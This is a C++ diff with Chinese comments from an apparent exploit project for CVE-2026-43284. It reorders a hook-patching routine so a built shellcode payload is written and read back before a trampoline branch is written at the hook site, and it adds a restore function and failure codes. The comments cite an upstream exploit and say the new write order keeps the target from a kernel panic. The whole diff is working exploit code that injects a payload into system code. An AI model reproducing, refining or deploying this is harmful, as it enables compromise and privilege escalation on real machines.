@@ -32,6 +32,8 @@ namespace ghostlock::backend::cve_2026_43284::steps {
     inline constexpr const char *kDisplacedMismatch = "step-displaced-mismatch";
     inline constexpr const char *kHookWriteRefused = "step-hook-write-refused";
     inline constexpr const char *kHookVerifyFailed = "step-hook-verify-failed";
+    inline constexpr const char *kRestoreWriteRefused = "step-restore-write-refused";
+    inline constexpr const char *kRestoreVerifyFailed = "step-restore-verify-failed";
     inline constexpr const char *kPayloadNotBuilt = "step-payload-not-built";
     inline constexpr const char *kTriggerForkFailed = "step-trigger-fork-failed";
     inline constexpr const char *kTriggerWaitFailed = "step-trigger-wait-failed";
@@ -152,6 +154,36 @@ namespace ghostlock::backend::cve_2026_43284::steps {
             *refusal = kDisplacedMismatch;
             return false;
         }
+        /* 写序（机械改动：站点写+回读整段从预检之后移到载荷之后，预检一字未改；2026-10-16 审计 #1/H1）：
+         * 先把载荷逐块写完并逐块确认，**最后**才写包裹站点的那一块。成功历史
+         * git show 6f7ded87:src/core/backend/cve_2026_43284/steps/hook_patch.cpp:176-189 是“先 shellcode 全部块、
+         * 再写 trampoline 块”，上游 exp.c:716-740 同序。反过来（站点先写）会让分支立刻指向尚未写入的
+         * landing：任何走到该 sentry 的进程（init 日志路径）执行零字节而死 ⇒ 内核 panic。
+         * 因此站点写之前的所有失败分支都返回，不带任何站点写。 */
+        std::uint8_t payload[64U * 64U] = {};
+        std::size_t payload_size = 0U;
+        if (hook::build_sentry_payload(plan, payload, sizeof(payload), payload_size) != hook::SentryError::Ok) {
+            *refusal = kPayloadNotBuilt;
+            return false;
+        }
+        GL_LOGI("hook payload: off=0x%llx size=%zu width=%zu max=%llu entry=0x%zx",
+                static_cast<unsigned long long>(plan.payload_file_offset), payload_size, request.width,
+                static_cast<unsigned long long>(plan.payload_max_bytes), plan.entry_offset);
+        WriteRequest body{};
+        body.access = request.access;
+        body.params = request.params;
+        body.image = std::span<const std::byte>(reinterpret_cast<const std::byte *>(payload), payload_size);
+        body.offset = plan.payload_file_offset;
+        body.width = request.width;
+        body.channel = request.channel;
+        if (!write_image_verified(body, refusal)) {
+            /* 载荷没写完 ⇒ 站点块从未被写，分支没有生效，拒绝名沿用载荷那一段（step-write-refused /
+             * step-verify-failed）。 */
+            return false;
+        }
+        /* 载荷的块循环把 params->offset 留在最后一块上：站点写必须重新定位，否则这一整块会落到 landing 里。 */
+        request.params->offset = block_at;
+        request.params->offset_set = true;
         block[within] = static_cast<std::byte>(branch & 0xFFU);
         block[within + 1U] = static_cast<std::byte>((branch >> 8U) & 0xFFU);
         block[within + 2U] = static_cast<std::byte>((branch >> 16U) & 0xFFU);
@@ -175,23 +207,70 @@ namespace ghostlock::backend::cve_2026_43284::steps {
             *refusal = kHookVerifyFailed;
             return false;
         }
-        std::uint8_t payload[64U * 64U] = {};
-        std::size_t payload_size = 0U;
-        if (hook::build_sentry_payload(plan, payload, sizeof(payload), payload_size) != hook::SentryError::Ok) {
-            *refusal = kPayloadNotBuilt;
+        return true;
+    }
+    bool restore_hook(const hook::SentryPlan &plan, HookRequest &request, const char **refusal) noexcept {
+        if (request.access == nullptr || request.params == nullptr) {
+            *refusal = kNoAccess;
             return false;
         }
-        GL_LOGI("hook payload: off=0x%llx size=%zu width=%zu max=%llu entry=0x%zx",
-                static_cast<unsigned long long>(plan.payload_file_offset), payload_size, request.width,
-                static_cast<unsigned long long>(plan.payload_max_bytes), plan.entry_offset);
-        WriteRequest body{};
-        body.access = request.access;
-        body.params = request.params;
-        body.image = std::span<const std::byte>(reinterpret_cast<const std::byte *>(payload), payload_size);
-        body.offset = plan.payload_file_offset;
-        body.width = request.width;
-        body.channel = request.channel;
-        return write_image_verified(body, refusal);
+        if (request.width < 8U) {
+            *refusal = kImageNotAligned;
+            return false;
+        }
+        std::byte block[64] = {};
+        /* 新代码自带的界：宽度不得超过下面这块局部缓冲（write_hook 的既有预检不动，这里只是新函数自己的前提）。 */
+        if (request.width > sizeof(block)) {
+            *refusal = kImageNotAligned;
+            return false;
+        }
+        const std::uint64_t block_at = plan.hook_file_offset - (plan.hook_file_offset % request.width);
+        const std::size_t within = static_cast<std::size_t>(plan.hook_file_offset - block_at);
+        if (within < 4U) {
+            *refusal = kGuardInAnotherBlock;
+            return false;
+        }
+        /* 读旧块（整块）——与写钩子时读到的是同一块，其余字节原样写回。 */
+        request.params->offset = block_at;
+        request.params->offset_set = true;
+        const auto before = request.access->read(0U, request.width, request.channel, *request.params);
+        if (!before.ok() || before.value.size() != request.width) {
+            *refusal = kSiteBlockUnread;
+            return false;
+        }
+        for (std::size_t i = 0U; i < request.width; ++i) { block[i] = before.value[i]; }
+        /* 还原段（成功历史：git show 6f7ded87:src/core/backend/cve_2026_43284/steps/hook_patch.cpp:210-225
+         *  —— restore_hook_patch 先整块写回 trampoline_orig（站点字就在这一块里），再写 shellcode 的原文块。
+         *  这里做同一件事的最小步：只把站点所在块的两字按计划写回，先 guard、再 displaced）。 */
+        GL_LOGI("restore: site block off=0x%llx within=%zu guard=0x%08x displaced=0x%08x",
+                static_cast<unsigned long long>(block_at), within,
+                static_cast<unsigned>(plan.guard_instruction),
+                static_cast<unsigned>(plan.displaced_instruction));
+        const auto put_word = [&](std::size_t at, std::uint32_t word) noexcept {
+            block[at] = static_cast<std::byte>(word & 0xFFU);
+            block[at + 1U] = static_cast<std::byte>((word >> 8U) & 0xFFU);
+            block[at + 2U] = static_cast<std::byte>((word >> 16U) & 0xFFU);
+            block[at + 3U] = static_cast<std::byte>((word >> 24U) & 0xFFU);
+        };
+        put_word(within - 4U, plan.guard_instruction);
+        put_word(within, plan.displaced_instruction);
+        const auto wrote = request.access->write(0U, std::span<const std::byte>(block, request.width),
+                                                request.channel, *request.params);
+        if (!wrote.ok() || wrote.value != request.width) {
+            *refusal = kRestoreWriteRefused;
+            return false;
+        }
+        const auto after = request.access->read(0U, request.width, request.channel, *request.params);
+        const bool same = after.ok() && after.value.size() == request.width &&
+                          std::memcmp(after.value.data(), block, request.width) == 0;
+        GL_LOGI("restore writeback: wrote=%zu/%zu off=0x%llx readback_ok=%d readback_same=%d",
+                wrote.value, request.width, static_cast<unsigned long long>(block_at),
+                after.ok() ? 1 : 0, same ? 1 : 0);
+        if (!same) {
+            *refusal = kRestoreVerifyFailed;
+            return false;
+        }
+        return true;
     }
     const char *trigger_orphan(std::uint32_t delay_ms) noexcept {
         const pid_t child = ::fork();
